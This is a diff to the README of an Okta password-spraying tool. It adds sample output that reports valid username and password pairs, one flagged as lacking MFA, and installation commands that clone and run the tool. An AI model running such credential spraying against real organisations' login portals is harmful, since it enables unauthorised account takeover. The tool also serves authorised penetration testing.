@@ -17,3 +17,19 @@ optional arguments:
   -h, --help         show this help message and exit
   --threads THREADS  Number of threads. Default: 7
 ```
+
+Sample output:
+```
+┌─[justin@parrot]─[~/projects/Okta-Password-Sprayer]
+└──╼ $python oSpray.py ExampleSub usernameList passwordList
+Valid Credentials! aUser:Summer18
+Valid Credentials without MFA! bUser:Summer18
+```
+
+### Installation
+```
+git clone https://github.com/Rhynorater/Okta-Password-Sprayer.git
+cd Okta-Password-Sprayer/
+pip install -r requirements.txt
+python oSpray.py --help
+```
